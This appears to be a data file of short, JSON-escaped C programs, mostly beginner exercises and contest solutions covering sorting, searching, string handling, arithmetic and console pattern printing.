    "#include <stdio.h>\nint main(void) {\n    char nome[61];\n    float salario = 0;\n    printf(\"Nome do funcion\u00e1rio:\");\n    scanf(\"%s\", &*nome);\n    printf(\"Sal\u00e1rio:\");\n    scanf(\"%f\", &salario);\n    printf(\"O funcionario %s tem um sal\u00e1rio de R$%.2f em abril\\n\", nome, salario);\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char const *argv[])\n{\n    char a[20], b[20], p_palavra;\n    int i, j, cont_int = 0, cont_ocor = 0;\n    printf(\"Digite a string a: \");\n    scanf(\"%s\", a);\n    printf(\"Digite a string b: \");\n    scanf(\"%s\", b);\n    p_palavra = a[0];\n    for (i = 0; i < strlen(b); i++)\n    {\n        if (b[i] == p_palavra)\n        {\n            cont_int = 0;\n            for (j = 0; j < strlen(a); j++)\n            {\n                if (b[i + j] != a[j])\n                {\n                    break;\n                } else {\n                    cont_int++;\n                }\n            }\n            if (cont_int == strlen(a))\n            {\n                cont_ocor++;\n            }\n        }\n    }\n    printf(\"Existem %d palavras A dentro de B\", cont_ocor);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint num,i=1;\nint fact = 1;\nprintf(\"\\nEnter and number\");\nscanf(\"%d\",&num);\nwhile(i<=num)\n{\nfact = fact*i;\ni++;\n}\nprintf(\"\\nFactorial of %d = %d\", num,fact);\n}",
    "#include<stdio.h>\nint main( int argc, char *argv[] )\n{\n    FILE *in, *out;\n    int c;\n    if( argc != 3 )\n    {\n fprintf( (stderr), \"Need two files names\\n\" );\n return 1;\n    }\n    if( ( in = fopen( argv[1], \"r\" ) ) == ((void*)0) )\n    {\n fprintf( (stderr), \"Can't read %s.\\n\", argv[2] );\n return 2;\n    }\n    if( ( out = fopen( argv[2], \"w\" ) ) == ((void*)0) )\n    {\n fprintf( (stderr), \"Can't write %s.\\n\", argv[2] );\n return 3;\n    }\n    while( ( c = getc( in ) ) != (-1) )\n putc( c, out );\n    printf( \"File has been copied.\\n\" );\n    fclose( in );\n    fclose( out );\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n int i, n, j;\n i = 1;\n j = 1;\n printf(\"Digite o n\u00famero representando o tamanho do lado: \");\n scanf(\"%d\", &n);\n while(j <= n)\n {\n  i = 1;\n  while(i <= n)\n  {\n   printf(\"* \");\n   i = i + 1;\n  }\n printf(\"\\n\");\n j = j + 1;\n }\n printf(\" Fim\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n printf(\"Hello World\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint squared (int variable);\nint cubed (int variable);\nint main()\n{\n    int iterator;\n    for(iterator=5;iterator<=100;iterator++)\n    {\n        if(iterator % 7 == 0)\n        {\n            printf(\"%d is a multiple of 7 and its square is %d and its cubed is %d\\n\", iterator, squared(iterator), cubed(iterator));\n        }\n    }\n    return 0;\n}\nint squared (int variable)\n{\n    return (variable * variable);\n}\nint cubed (int variable)\n{\n    return (variable * variable * variable);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid bubble_sort(int *array, int n, int modo);\nvoid bubble_sort_flag(int *array, int tam);\nvoid troca(int *a, int j);\nint main(){\n    int array[] = {7, 10, 5, 3, 8, 4, 2, 9, 6};\n    int tam = sizeof(array)/sizeof(int);\n    int modo;\n    printf(\"Modo: \");\n    scanf(\"%d\", &modo);\n    bubble_sort(array, tam, modo);\n    for(int i = 0; i < tam; i++){\n        printf(\"array[%i] = %i\\n\", i, array[i]);\n    }\n    return 0;\n}\nvoid bubble_sort(int *array, int n, int modo){\n    int i, j, temp;\n    if(modo){\n        for(i = n; i > 1; i--){\n            for(j = 0; j < i-1; j++){\n                if(array[j] > array[j+1]){\n                    troca(array, j);\n                }\n            }\n        }\n    }else{\n        for(i = n; i > 1; i--){\n            for(j = 0; j < i-1; j++){\n                if(array[j] < array[j+1]){\n                    troca(array, j);\n                }\n            }\n        }\n    }\n}\nvoid bubble_sort_flag(int *array, int tam){\n    int i, j, temp, flag;\n    for(i = tam; i > 1; i--){\n        flag = 0;\n        for(j = 0; j < i-1; j++){\n            if(array[j] > array[j+1]){\n                troca(array, j);\n                flag = 1;\n            }\n        }\n        if(!flag){\n            break;\n        }\n    }\n}\nvoid troca(int *a, int j){\n    int temp = a[j+1];\n    a[j+1] = a[j];\n    a[j] = temp;\n}",
    "#include <stdio.h>\nint main()\n{\n    int zippol[4][2] = { { 2, 4 }, { 6, 8 }, { 1, 3 }, { 5, 7 } };\n    printf(\"zippol = %p,   zippol + 1 = %p\\n\", zippol, zippol + 1);\n    printf(\"zippol[0] = %p, zippol[0] + 1 = %p\\n\", zippol[0], zippol[0] + 1);\n    printf(\"*zippol = %p, *zippol + 1 = %p\\n\", *zippol, *zippol + 1);\n    printf(\"zippol[0][0] = %d\\n\", zippol[0][0]);\n    printf(\"*zippol[0] = %d\\n\", *zippol[0]);\n    printf(\"**zippol = %d\\n\", **zippol);\n    printf(\"zippol[2][1] = %d\\n\", zippol[2][1]);\n    printf(\"*(*(zippol + 2) + 1) = %d\\n\", *(*(zippol + 2) +1));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid checkIntInput(int *, int *);\nint main()\n{\n    int n, k;\n    int factorialN = 1;\n    int factorialK = 1;\n    printf(\"Enter n and k: \");\n    checkIntInput(&n, &k);\n    if (k > 1 && k < n && k < 100)\n    {\n        int i;\n        for (i = 1; i <= n; i++)\n        {\n            factorialN *= i;\n            if (i <= k)\n            {\n                factorialK *= i;\n            }\n        }\n        printf(\"%d\", factorialN / factorialK);\n    }\n    else\n    {\n        printf(\"The numbers should be (1 < k < n < 100)!\");\n        exit(1);\n    }\n    return (0);\n}\nvoid checkIntInput(int *a, int *b)\n{\n    if ((scanf(\"%d %d\", a, b)) != 2)\n    {\n        printf(\"Not digit!\");\n        exit(1);\n    }\n}",
    "extern void abort (void);\nextern void exit (int);\nvoid foo(void)\n{\n  exit(0);\n}\nstatic void bar(void) __attribute__((alias(\"foo\")));\nint main()\n{\n  bar();\n  abort ();\n}",
    "#include <stdio.h>\nint main(void) {\n    int start;\n    int end;\n    printf(\"plz input start & end:\");\n    while(scanf(\"%d %d\", &start, &end) == 2) {\n        if (start >= end) break;\n        int sum = 0;\n        for (int i = start; i <= end; i++) {\n           sum += i * i;\n        }\n        printf(\"sum is %d\\n\", sum);\n        printf(\"plz input start & end:\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    printf(\"enter number of rows: \");\n    int n;\n    scanf(\"%D\", &n);\n    for(int i=0; i<n; i++){\n        for(int j=n; j>n-i-1; j--)\n            printf(\"%d \", j);\n        printf(\"\\n\");\n    }\n    for(int i=0; i<n; i++){\n        for(int j=n-1; j>i; j--)\n            printf(\" \");\n        for(int j=0; j<i; j++)\n            printf(\"*\");\n        printf(\"\\n\");\n    }\n    for(int i=n; i>0; i--){\n        for(int j=1; j<=i; j++)\n            printf(\"%d \", j);\n        printf(\"\\n\");\n    }\n    printf(\"\\n\");\n    for(int i=2; i<=n+1; i++){\n        for(int j=i; j<=n+1; j++)\n            printf(\"%d \", j);\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nint count_char(char s[],char a){\n    int count=0,i=0;\n    while((s[i]!='\\0')){\n        if(s[i]==a){\n            count++;\n        }\n        i++;\n    }\n    return count;\n}\nint check_substring(char s1[],char s2[]){\n    int i,j=0,check=0;\n    for(i=0;s1[i]!='\\0';++i){\n        if(s1[i]==s2[j]){\n            break;\n        }\n    }\n    if(s1[i]!='\\0'){\n        for(;(s1[i]!='\\0')&&(s2[j]!='\\0');){\n            if(s2[j]==s1[i]){\n                check=1;\n                ++i;\n                ++j;\n                continue;\n            }\n            else{\n                check=0;\n                break;\n            }\n        }\n    }\n    return check;\n}\nint main() {\n    int n,count,check=0;\n    char c,s1[100],s2[100];\n scanf(\"%s\\n\",s1);\n scanf(\"%c %d\\n\",&c,&n);\n scanf(\"%s\",s2);\n count=count_char(s1,c);\n if(count<n){\n     check++;\n }\n check=check+check_substring(s1,s2);\n if(check==1){\n     printf(\"YES\");\n }\n else{\n     printf(\"NO\");\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<assert.h>\nint A[] = {1,3,5,7,9,11,13,15,17,19,21};\nint B[] = {1,1,1,3,3,3,5,5,5,7,7,7,9,9,9};\nint lower_bound(int* A, int x, int y, int v) {\n  int m;\n  while(x < y) {\n    m = x+(y-x)/2;\n    if(A[m]>=v) y=m; else x=m+1;\n  }\n  return x;\n}\nint upper_bound(int* A, int x, int y, int v) {\n  int m;\n  while(x < y) {\n    m = x+(y-x)/2;\n    if(A[m]<=v) x=m+1; else y=m;\n  }\n  return x;\n}\nint main() {\n  int i;\n  for(i = 1; i <= 21; i++)\n    printf(\"%d\\n\", upper_bound(A, 0, 11, i));\n  for(i = 0; i <= 11; i++)\n    printf(\"%d %d\\n\", i, upper_bound(B, 0, 15, i));\n  printf(\"Ok!\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int size;\n    int line;\n    int column;\n    printf(\"\\nInsert a number to print a arrow shaped glyph\");\n    printf(\"--->\");\n    scanf(\"%d\", &size);\n    if (size == 0){\n        printf(\"\\nInvalid value\");\n    }\n    if (size >= 20){\n        size = 20;\n    }\n    char arrow[size][size*2];\n    for(column=0; column < size*2; column++){\n        arrow[0][column] = '*';\n    }\n    for (column = 0; column < size; column++){\n        for(line = size; line > 1; line--){\n            if (column % 2 == 0){\n                arrow[line-1][column] = '1';\n            }else{\n                arrow[line-1][column] = '2';\n            }\n        }}\n    for (column = 0; column < size*2; column++){\n            printf(\"\\n\");\n        for(line =0; line < size; line++){\n            printf(\" %c \", arrow[line][column]);\n        }\n    }\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    int n, tmp;\n    double l2=log10(2);\n    while (scanf(\"%d\", &n)) {\n        if (!n) break;\n        tmp=ceil(log10(n)/l2);\n        tmp=pow(2, tmp);\n        printf(\"%d\\n\", n+n-tmp);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,a,b,h,hcf;\n    scanf(\"%d %d\",&a,&b);\n    h=(a<b)?a:b;\n    for(i=1;i<=h;i++)\n    {\n        if(a%i==0 && b%i==0)\n        {\n            hcf=i;\n        }\n    }\n    printf(\"%d\",hcf);\n}",
    "#include <stdio.h>\n#include <pthread.h>\nvoid *func(void *ptr)\n{\n        int n = *(int *)ptr + 1;\n        printf(\"Stack level %d\\n\", n);\n        func(&n);\n        return ((void*)0);\n}\nint main()\n{\n        int n = 0;\n        pthread_t t;\n        pthread_create(&t, ((void*)0), func, &n);\n        pthread_join(t, ((void*)0));\n        return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n    float amount, aver, total;\n    int i;\n    for (i=1,total=0; i<=1000; i++)\n    {\n        printf(\"plz input amount:\");\n        scanf(\"%f\", &amount);\n        total = total + amount;\n        if (total>=100000)\n            break;\n    }\n    aver = total / i;\n    printf(\"num=%d\\naver=%10.2f\\n\",i,aver);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int pares[5], vetor[5], i, cont = 0;\n    for(i = 0; i < 5; i++){\n        printf(\"Digite um numero: \");\n        scanf(\"%d\",&vetor[i]);\n        if((vetor[i] % 2 == 0) && (vetor[i] > 0)){\n            pares[cont] = vetor[i];\n            cont += 1;\n        }\n    }\n    printf(\"Os valores pares sao: \\n\");\n    for(i = 0; i < cont; i++){\n        printf(\"%d\\n\",pares[i]);\n    }\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int n, i, count=0;\n    char check[30];\n    for(i=0; i<30; i++)\n        check[i]=0;\n    scanf(\"%d\", &n);\n    char str[n+10];\n    scanf(\"%s\", str);\n    if(n>26)\n    {\n        count=-1;\n    }\n    else\n    {\n        for(i=0; i<n; i++)\n        {\n            if(check[str[i]-'a'])\n                count++;\n            else\n                check[str[i]-'a']=1;\n        }\n    }\n    printf(\"%d\\n\", count);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\nunsigned int i=1;\nchar*c=(char*)&i;\n if(*c){printf(\"little endian\\n\");\n    }\n else {\n  printf(\"big endian\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int num;\n    scanf(\"%d\",&num);\n    (num!=0 && num % 3 == 0)?printf(\"\\nVERDADEIRO\\n\"):printf(\"\\nFALSO\\n\");\n}",
    "#include <stdio.h>\n#include <string.h>\n\nvoid inverte(char *strOriginal, char *strInvertida) {\n    int i;\n    for (i = 0; i < strlen(strOriginal); i++) {\n        strInvertida[i] = strOriginal[strlen(strOriginal) - i - 1];\n    }\n}\nint main() {\n    char strOriginal[100] = {}, strInvertida[100] = {};\n    while (1) {\n        printf(\"Palavra? \");\n        scanf(\"%s\", strOriginal);\n        if (strcmp(strOriginal, \".\") == 0) return 0;\n        inverte(strOriginal, strInvertida);\n        if (strcmp(strOriginal, strInvertida) == 0) {\n            printf(\"Resultado : %s e capicua\\n\", strOriginal);\n        } else {\n            printf(\"Resultado : %s nao e capicua\\n\", strOriginal);\n        }\n    }\n}",
    "#include <stdio.h>\n#include <time.h>\nint binsearch(int x, int v[], int n)\n{\n int low, high, mid;\n low = 0;\n high = n - 1;\n while (low <= high) {\n  mid = (low + high) / 2;\n  if (x < v[mid])\n   high = mid - 1;\n  else if (x > v[mid])\n   low = mid + 1;\n  else\n   return mid;\n }\n return -1;\n}\nint binsearch_fast(int x, int v[], int n)\n{\n int low, high, mid;\n low = 0;\n high = n - 1;\n while (low < high) {\n  mid = (low + high + 1) / 2;\n  if (x < v[mid])\n   high = mid - 1;\n  else\n   low = mid;\n }\n        if (v[low] == x)\n  return low;\n return -1;\n}\nint main()\n{\n int test_array[10];\n for (int i = 0; i < 10; i++)\n {\n  test_array[i] = i;\n }\n test_array[3] = 4;\n int result;\n int numruns = 1000;\n clock_t begin, end;\n double time_spent, time_spent_fast;\n begin = clock();\n for (int i = 0; i < numruns; i++)\n  result = binsearch(3, test_array, 10);\n end = clock();\n time_spent = (double)(end-begin) / ((clock_t)1000000000);\n printf(\"\\n%f sec\\tfor binsearch\", time_spent);\n begin = clock();\n for (int i = 0; i < numruns; i++)\n  result = binsearch_fast(3, test_array, 10);\n end = clock();\n time_spent_fast = (double)(end-begin) / ((clock_t)1000000000);\n printf(\"\\n%f sec\\tfor binsearch_fast\", time_spent_fast);\n printf(\"\\n\\n\");\n}",
    "#include<stdio.h>\n#include<math.h>\nfloat f(float x){\n  return sin(x)-x*cos(x);\n}\nint main()\n{\n    float a,b,x1,x2,x3;\n    printf(\"Enter the min value x(a): \");\n    scanf(\"%f\",&a);\n    printf(\"Enter the max value x(b): \");\n    scanf(\"%f\",&b);\n    for(x1=a;x1<=b;x1+=0.01){\n        x2=x1+0.01;\n        if(f(x1)*f(x2)<=0){\n          do{\n              x3=(x1*f(x2)-x2*f(x1))/(f(x2)-f(x1));\n              x1=x2;\n              x2=x3;\n          }while(fabs(f(x3))>0.00001);\n          printf(\"\\nIn the interval: %.3lf and %.3lf\\n\",x1,x2);\n          printf(\"The root is: %.4lf\\n\",x3);\n        }\n    }\n}",
    "#include <stdio.h>\n\n\nint main(void)\n{\n    float miles, gallons, km, liters;\n    printf(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u043e\u0439\u0434\u0435\u043d\u043d\u043e\u0435 \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0432 \u043c\u0438\u043b\u044f\u0445:\\n\");\n    scanf(\"%f\", &miles);\n    printf(\"\u0430 \u0442\u0435\u043f\u0435\u0440\u044c \u043e\u0431\u044a\u0435\u043c \u0437\u0430\u0442\u0440\u0430\u0447\u0435\u043d\u043d\u043e\u0433\u043e \u0442\u043e\u043f\u043b\u0438\u0432\u0430 \u0432 \u0433\u0430\u043b\u043b\u043e\u043d\u0430\u0445:\\n\");\n    scanf(\"%f\", &gallons);\n    printf(\"\u041d\u0430 \u043e\u0434\u043d\u043e\u043c \u0433\u0430\u043b\u043b\u043e\u043d\u0435 \u0442\u043e\u043f\u043b\u0438\u0432\u0430 \u0432\u044b \u043f\u0440\u043e\u0435\u0437\u0436\u0430\u0435\u0442\u0435 %.1f \u043c\u0438\u043b\u044c.\\n\",\n        miles/gallons);\n    printf(\"\u0418\u0442\u043e\u0433\u043e \u0432\u0430\u0448 \u0440\u0430\u0441\u0445\u043e\u0434 \u0442\u043e\u043f\u043b\u0438\u0432\u0430 \u0441\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 %.1f \u0433\u0430\u043b\u043b\u043e\u043d\u043e\u0432 \u043d\u0430 \"\n           \"100 \u043c\u0438\u043b\u044c.\\n\", 100/(miles/gallons));\n    printf(\"\u041f\u0435\u0440\u0435\u0432\u0435\u0434\u0435\u043c \u043f\u0440\u043e\u0439\u0434\u0435\u043d\u043d\u044b\u0439 \u043f\u0443\u0442\u044c \u0432 \u043a\u0438\u043b\u043e\u043c\u0435\u0442\u0440\u044b:\\n\");\n    km = miles*1.609;\n    printf(\"%.1f \u043c\u0438\u043b\u044c = %.1f \u043a\u0438\u043b\u043e\u043c\u0435\u0442\u0440\u043e\u0432\\n\", miles, km);\n    printf(\"\u041f\u0435\u0440\u0435\u0432\u0435\u0434\u0435\u043c \u0437\u0430\u0442\u0440\u0430\u0447\u0435\u043d\u043d\u044b\u0439 \u043e\u0431\u044a\u0435\u043c \u0442\u043e\u043f\u043b\u0438\u0432\u0430 \u0438\u0437 \u0433\u0430\u043b\u043b\u043e\u043d\u043e\u0432 \u0432 \"\n           \"\u043b\u0438\u0442\u0440\u044b:\\n\");\n    liters = 3.785*gallons;\n    printf(\"%.1f \u0433\u0430\u043b\u043b\u043e\u043d\u043e\u0432 = %.1f \u043b\u0438\u0442\u0440\u043e\u0432.\\n\", gallons, liters);\n    printf(\"\u041d\u0430 \u043e\u0434\u043d\u043e\u043c \u043b\u0438\u0442\u0440\u0435 \u0442\u043e\u043f\u043b\u0438\u0432\u0430 \u0432\u044b \u043f\u0440\u043e\u0435\u0437\u0436\u0430\u0435\u0442\u0435 %.1f \u043a\u0438\u043b\u043e\u043c\u0435\u0442\u0440\u043e\u0432.\\n\",\n        km/liters);\n    printf(\"\u0418\u0442\u043e\u0433\u043e \u0432\u0430\u0448 \u0440\u0430\u0441\u0445\u043e\u0434 \u0442\u043e\u043f\u043b\u0438\u0432\u0430 \u0441\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 %.1f \u043b\u0438\u0442\u0440\u043e\u0432 \u043d\u0430 100 \"\n           \"\u043a\u0438\u043b\u043e\u043c\u0435\u0442\u0440\u043e\u0432.\\n\", 100/(km/liters));\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main()\n{\n int mat[10][10], correct[10][10], mat_size;\n float sum[10], mean[10], std[10];\n int factor, val, row, col;\n scanf(\"%d %d\", &mat_size, &factor);\n for (row = 0; row < mat_size; row++) {\n  for (col = 0; col < mat_size; col++) {\n   scanf(\"%d\", &val);\n   mat[row][col] = factor * val;\n  }\n }\n for (col = 0; col < mat_size; col++) {\n  sum[col] = mean[col] = std[col] = 0;\n  for (row = 0; row < mat_size; row++) {\n   scanf(\"%d\", &val);\n   correct[row][col] = mat[row][val];\n   sum[col] += correct[row][col];\n  }\n  mean[col] = sum[col] / mat_size;\n  for (row = 0; row < mat_size; row++)\n   std[col] += pow(correct[row][col] - mean[col], 2);\n  std[col] = sqrt(std[col] / mat_size);\n }\n puts(\"Matriz corrigida \");\n for (row = 0; row < mat_size; row++) {\n  for (col = 0; col < mat_size; col++)\n   printf(\"%d\\t\", correct[row][col]);\n  puts(\"\");\n }\n printf(\"Somas::\");\n for (col = 0; col < mat_size; col++)\n  printf(\"%.2f\\t\", sum[col]);\n printf(\"\\nMedias::\");\n for (col = 0; col < mat_size; col++)\n  printf(\"%.2f\\t\", mean[col]);\n printf(\"\\nDesvios::\");\n for (col = 0; col < mat_size; col++)\n  printf(\"%.2f\\t\", std[col]);\n puts(\"\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint a[105];\nint b[105];\nint j,n;\nint res;\nint N(int l , int r){\n    res = 0;\n    for(j=l;j<=r;j++){\n        res += a[j];\n    }\n    return res%n;\n}\nint M(int l , int r){\n    res = 1;\n    for(j=l;j<=r;j++){\n        res = (res * (a[j] % n))%n;\n    }\n    return res;\n}\nint H(int l , int r){\n    res = 0;\n    for(j=l,res=a[j];j < r;j++){\n        res = res ^ a[j+1];\n    }\n    return res;\n}\nint main()\n{\n    int K,l,r,i,l1,r1;\n    scanf(\"%d%d\",&n,&K);\n    for(i=0;i<n;i++){\n        scanf(\"%d\",&a[i]);\n    }\n    for(i=0;i<K;i++){\n        scanf(\"%d%d\",&l,&r);\n        l1 = N(l,r)>M(l,r)?M(l,r):N(l,r);\n        r1 = N(l,r)<M(l,r)?M(l,r):N(l,r);\n        b[i] = H(l1,r1);\n    }\n    for(i=0;i<K;i++){\n        printf(\"%d\\n\",b[i]);\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main(){\n int testcase=0;\n scanf(\"%d\",&testcase);\n while(testcase--){\n  int hashtable[26]={0};\n  int i=0;\n  int flag=0;\n  char word[100000];\n  scanf(\"%s\",word);\n  for(i=0;i<strlen(word);i++)\n  {\n   int temp = (int)word[i]-97;\n   hashtable[temp]++;\n  }\n  for(i=0;i<strlen(word);i++)\n  {\n   int temp = (int)word[i]-97;\n   if(hashtable[temp]%2!=0){\n    flag=1;\n    break;\n   }\n  }\n  if(flag==1)\n   printf(\"-1\\n\");\n  else\n   printf(\"1\\n\");\n }\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <assert.h>\n#include <limits.h>\n#include <stdbool.h>\nvoid sort(char *word){\n    for(int i = 0; i < strlen(word); i++){\n        for(int j = 0; j < strlen(word); j++){\n            if(word[i] < word[j]){\n                int temp = word[j];\n                word[j] = word[i];\n                word[i] = temp;\n            }\n        }\n    }\n}\nint main(){\n    char a;\n    int *h = malloc(sizeof(int) * 26), len;\n    for(int h_i = 0; h_i < 26; h_i++){\n       scanf(\"%d\",&h[h_i]);\n    }\n    char* word = (char *)malloc(512000 * sizeof(char));\n    scanf(\"%s\",word);\n    sort(word);\n    len = strlen(word);\n    int j = 0;\n    for(int i = 0; i < strlen(word); i++){\n        if(word[i] != word[i+1]){\n            word[j++] = word[i];\n        }\n    }\n    word[j] = '\\0';\n    int max = 0;\n    for(int i = 0, temp; i < strlen(word); i++){\n        for(j = 0, a = 97; j < 26; j++,a++){\n            if(word[i] == a){\n                temp = h[j];\n                break;\n            }\n        }\n        if(max < temp)\n            max = temp;\n    }\n    printf(\"%ld\",(long int)len*max);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint my_getline(char line[], int max);\nint strindex(char source[], char searchfor[]);\nint strrindex(char source[], char searchfor[]);\nchar pattern[] = \"ould\";\nchar pattern2[] = \"ea\";\nint main()\n{\n    char line[1000];\n    int found = 0;\n    int i;\n    while (my_getline(line, 1000) > 0)\n        if ((i = strrindex(line, pattern2)) >= 0) {\n            printf(\"%d\\t: %s\", i, line);\n            found++;\n        }\n    return found;\n}\nint my_getline(char s[], int lim)\n{\n    int c, i;\n    i = 0;\n    while (--lim > 0 && (c=getchar()) != (-1) && c != '\\n')\n        s[i++] = c;\n    if (c == '\\n')\n        s[i++] = c;\n    s[i] = '\\0';\n    return i;\n}\nint strindex(char s[], char t[])\n{\n    int i, j, k;\n    for (i = 0; s[i] != '\\0'; ++i) {\n        for (j = i, k = 0; t[k] != '\\0' && s[j] == t[k]; j++, k++)\n            ;\n        if (k > 0 && t[k] == '\\0')\n            return i;\n    }\n    return -1;\n}\nint strrindex(char s[], char t[])\n{\n    int i, j, k;\n    for (i = strlen(s) - 1; i >= 0; --i) {\n        for (j = i, k = 0; t[k] != '\\0' && s[j] == t[k]; ++j, ++k)\n            ;\n        if (k > 0 && t[k] == '\\0')\n            return i;\n    }\n    return -1;\n}",
    "#include <stdio.h>\n#include <netinet/in.h>\nint main(){\n    union {uint16_t u16; uint8_t c2[2];}a;\n    union {uint32_t u32; uint8_t c4[4];}b;\n    a.u16 = 0x0102; printf(\"0x%x,0x%x\\n\", a.c2[0], a.c2[1]);\n    a.u16 = htons(a.u16); printf(\"0x%x,0x%x\\n\", a.c2[0], a.c2[1]);\n    a.u16 = ntohs(a.u16); printf(\"0x%x,0x%x\\n\", a.c2[0], a.c2[1]);\n    b.u32 = 0x01020304;\n    printf(\"0x%x,0x%x,0x%x,0x%x\\n\",b.c4[0],b.c4[1],b.c4[2],b.c4[3]);\n    b.u32 = htonl(b.u32);\n    printf(\"0x%x,0x%x,0x%x,0x%x\\n\",b.c4[0],b.c4[1],b.c4[2],b.c4[3]);\n    b.u32 = ntohl(b.u32);\n    printf(\"0x%x,0x%x,0x%x,0x%x\\n\",b.c4[0],b.c4[1],b.c4[2],b.c4[3]);\n}",
    "#include <stdio.h>\n#include <unistd.h>\nchar * argv[] = {\"sh\",\"-c\",\"./pid\",((void*)0)};\nint main()\n{\n printf(\"EXECVP task,PID:%d\\n\",getpid());\n execvp(\"sh\",argv);\n printf(\"++++++++++\");\n return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n    int odd_count = 0;\n    int even_count = 0;\n    float odd_sum = 0.0;\n    float even_sum = 0.0;\n    int num;\n    printf(\"Enter a number to be analyzed (q or 0 to quit)\\n\");\n    while (1 == scanf(\"%d\", &num) && num != 0)\n    {\n        if (num % 2 == 0)\n        {\n            even_count++;\n            even_sum += num;\n        }\n        else {\n            odd_count++;\n            odd_sum += num;\n        }\n    }\n    printf(\"Done.\\n\");\n    printf(\"Odd number has %d, their average is %.1f.\\n\", odd_count, odd_sum / odd_count);\n    printf(\"Even number has %d, their average is %.1f.\\n\", even_count, even_sum / even_count);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char const *argv[])\n{\n long **a;\n int n=0;\n scanf(\"%d\",&n);\n a=(long**)malloc(n*sizeof(long*));\n for (int i = 0; i < n; ++i){\n  a[i]=(long*)malloc(3*sizeof(long));\n }\n for (int i = 0; i < n; ++i){\n  scanf(\"%ld%ld%ld\",&a[i][0],&a[i][1],&a[i][2]);\n }\n for (int i = 0; i < n; ++i){\n  printf(\"Case #%d: \", i+1);\n  if (a[i][0] > a[i][2] - a[i][1]){\n   printf(\"true\\n\");\n  }else{\n   printf(\"false\\n\");\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(){\n    int count = 0;\n    double totalCorrect = 0;\n    time_t timeStart;\n    timeStart = time(((void*)0));\n    while (count < 5){\n        int number1;\n        int number2;\n        srand(time(((void*)0)));\n        number1 = rand() % 10;\n        number2 = rand() % 10;\n        int userAnswer;\n        int subtraction;\n        subtraction = number1 - number2;\n        printf(\"\\nwhat is %d - %d = \", number1, number2);\n        scanf(\"%d\", &userAnswer);\n        count++;\n        if (userAnswer == subtraction){\n            printf(\"You are correct\\n\");\n            totalCorrect++;\n        }\n        if (userAnswer != subtraction){\n            printf(\"You are wrong\\n\");\n            printf(\"%d - %d should be %d\\n\", number1, number2, subtraction);\n        }\n    }\n    double ratio = totalCorrect / count;\n    double percentageOfTest = ratio * 100;\n    printf(\"\\nCorrect count is %.0lf\", totalCorrect);\n    time_t timeStop;\n    timeStop = time(((void*)0));\n    printf(\"\\nTest time %ld seconds\\n\", timeStop - timeStart);\n    char percentageSign = '%';\n    printf(\"Your average for this test is %.2lf%c\\n\", percentageOfTest, percentageSign);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n    float A, B, C, X;\n    scanf(\"%f %f %f\", &A, &B, &C);\n    if (A<B+C && B<A+C && C<A+B){\n        X=A+B+C;\n        printf(\"Perimetro = %.1f\\n\", X);\n    }\n    else {\n        X=((A+B)/2)*C;\n        printf(\"Area = %.1f\\n\", X);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int gun;\n    printf(\"Lutfen gun numarasi giriniz:\\n \");\n    scanf(\"%d\", &gun);\n    switch (gun)\n    {\n    case 1:\n        printf(\"Haftan\u0131n 1. g\u00fcn\u00fc: Pazartesi\");\n        break;\n    case 2:\n        printf(\"Haftan\u0131n 2. g\u00fcn\u00fc: Sal\u0131\");\n        break;\n    case 3:\n        printf(\"Haftan\u0131n 3. g\u00fcn\u00fc: \u00c7ar\u015famba\");\n        break;\n    case 4:\n        printf(\"Haftan\u0131n 4. g\u00fcn\u00fc: Per\u015fembe\");\n        break;\n    case 5:\n        printf(\"Haftan\u0131n 5. g\u00fcn\u00fc: Cuma\");\n        break;\n    case 6:\n        printf(\"Haftan\u0131n 6. g\u00fcn\u00fc: Cumartesi\");\n        break;\n    case 7:\n        printf(\"Haftan\u0131n 7. g\u00fcn\u00fc: Pazar\");\n        break;\n    default:\n        printf(\"Herhangi bir g\u00fcn girilmemi\u015ftir.\");\n        break;\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n int firstNumber, secondNumber, divisionoftwonumbers;\n printf(\"Enter a firstnumber:\");\n scanf(\"%d\" , &firstNumber);\n printf(\"Enter a secondnumber:\");\n scanf(\"%d\" , &secondNumber);\n divisionoftwonumbers = firstNumber / secondNumber;\n printf(\"divisionoftwonumbers: %d\\n\", divisionoftwonumbers);\n return 0;\n}",
